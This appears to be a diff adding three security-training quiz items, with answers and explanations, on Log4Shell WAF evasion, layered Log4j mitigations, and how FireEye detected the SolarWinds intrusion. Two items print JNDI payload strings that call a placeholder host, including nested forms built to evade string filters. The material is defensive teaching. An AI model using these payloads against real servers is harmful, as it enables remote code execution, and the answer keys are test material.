@@ -1,0 +1,100 @@
+[
+  {
+    "id": "secp-detection-response-q5",
+    "level": "intermediate",
+    "type": "single",
+    "prompt": "On 11 December 2021 your WAF blocks any request containing the literal string `${jndi:`. Which request still gets through and can still exploit a vulnerable Log4j?",
+    "options": [
+      {
+        "text": "`User-Agent: ${jndi:ldap://x.example/a}`",
+        "explanation": "This contains the literal `${jndi:` and would be blocked by the rule."
+      },
+      {
+        "text": "`User-Agent: ${${lower:j}ndi:ldap://x.example/a}`",
+        "explanation": "Correct. Log4j evaluates the inner `${lower:j}` to `j`, producing `${jndi:ldap://...}` at log time, but the raw request never contains the literal string the WAF looks for."
+      },
+      {
+        "text": "`User-Agent: jndi-ldap-x.example`",
+        "explanation": "Without the `${...}` lookup syntax, Log4j treats this as plain text; nothing is resolved."
+      },
+      {
+        "text": "`User-Agent: $jndi:ldap://x.example/a`",
+        "explanation": "Without braces this is not a lookup, so Log4j logs it literally."
+      }
+    ],
+    "answer": 1,
+    "workedExample": "1. Log4j processes nested lookups from the inside out.\n2. `${lower:j}` -> `j`, so `${${lower:j}ndi:...}` -> `${jndi:...}` -> JNDI lookup fires.\n3. The WAF matched raw bytes and saw no `${jndi:`.\n4. Cloudflare observed exactly this evolution within days, and advised treating *any* `${` as suspicious.\n5. The robust fix was patching; robust detection looked at behaviour (outbound LDAP from servers).",
+    "link": {
+      "title": "Log4j exploitation before disclosure and WAF evasion — Cloudflare",
+      "url": "https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/"
+    }
+  },
+  {
+    "id": "secp-detection-response-q8",
+    "level": "intermediate",
+    "type": "single",
+    "prompt": "What was reportedly the clue that led FireEye to uncover the SolarWinds campaign in late 2020?",
+    "options": [
+      {
+        "text": "An antivirus signature matching the SUNBURST DLL",
+        "explanation": "SUNBURST was compiled into a legitimately signed Orion DLL and had no known signature at the time; that is why it went unnoticed for months."
+      },
+      {
+        "text": "A spike in outbound traffic volume to Russia",
+        "explanation": "The attackers deliberately used infrastructure in the victim's own country and imitated Orion's protocol to avoid exactly this."
+      },
+      {
+        "text": "An unexpected additional authentication verifier associated with an employee account",
+        "explanation": "Correct. Mandia confirmed an unexpected authentication verifier was a tip-off; investigation established the wider compromise."
+      },
+      {
+        "text": "A customer's bug-bounty report",
+        "explanation": "The discovery came from FireEye's own investigation, not a bounty submission."
+      }
+    ],
+    "answer": 2,
+    "workedExample": "Mandia confirmed in Senate testimony that an unexpected additional authentication verifier was a tip-off. Investigation then connected the intrusion to the broader campaign. This illustrates the value of investigating identity anomalies; the checked testimony does not establish the precise employee-phone-call sequence.",
+    "link": {
+      "title": "SolarWinds Senate testimony",
+      "url": "https://www.govinfo.gov/content/pkg/CHRG-117shrg45485/html/CHRG-117shrg45485.htm"
+    }
+  },
+  {
+    "id": "secp-detection-response-q10",
+    "level": "advanced",
+    "type": "multi",
+    "prompt": "Which Log4Shell mitigations or detection layers address the vulnerable implementation or observe relevant exploit paths independently of the raw obfuscated request spelling? Select all that apply. Not every listed layer covers every possible exploit path.",
+    "options": [
+      {
+        "text": "Blocking outbound LDAP and RMI connections from application servers at the firewall, and alerting on attempts",
+        "explanation": "Correct as a layer against exploit paths requiring those outbound protocols, regardless of input obfuscation. It is not complete prevention: alternative egress, local gadgets and other behaviors need assessment."
+      },
+      {
+        "text": "Detecting Java processes spawning shells or download tools",
+        "explanation": "Correct for attacks that spawn those processes. Behavior detection is independent of the original string but does not cover every post-exploitation path."
+      },
+      {
+        "text": "Upgrading Log4j to a fixed version (eventually 2.17.1 for Java 8)",
+        "explanation": "Correct as historical root-cause remediation: install an appropriate maintained release fixed for the applicable advisories and Java line. The Java 8 releases progressed through 2.17.1 in December 2021; that is not a current universal upgrade target. Removing JndiLookup.class was a mitigation for affected paths, with advisory-specific limits."
+      },
+      {
+        "text": "A WAF rule matching the exact string `${jndi:ldap://`",
+        "explanation": "Incorrect. `${${lower:j}ndi:...}`, `${${::-j}...}` and the `dns:`/`rmi:` schemes all avoid it."
+      },
+      {
+        "text": "Scanning only HTTP request logs at the edge",
+        "explanation": "Incorrect. Any logged field could carry the payload (usernames, email headers, chat messages), including data that never passed the web edge."
+      }
+    ],
+    "answer": [
+      0,
+      1,
+      2
+    ],
+    "workedExample": "Literal-string WAF rules can be evaded and web-edge visibility is incomplete. Appropriate patching addresses the vulnerable implementation. Egress restrictions and behavioral detections add coverage for relevant exploit paths, but do not guarantee every possible execution or exfiltration behavior is detected.",
+    "link": {
+      "title": "Log4j exploitation before disclosure and WAF evasion — Cloudflare",
+      "url": "https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/"
+    }
+  }
+]
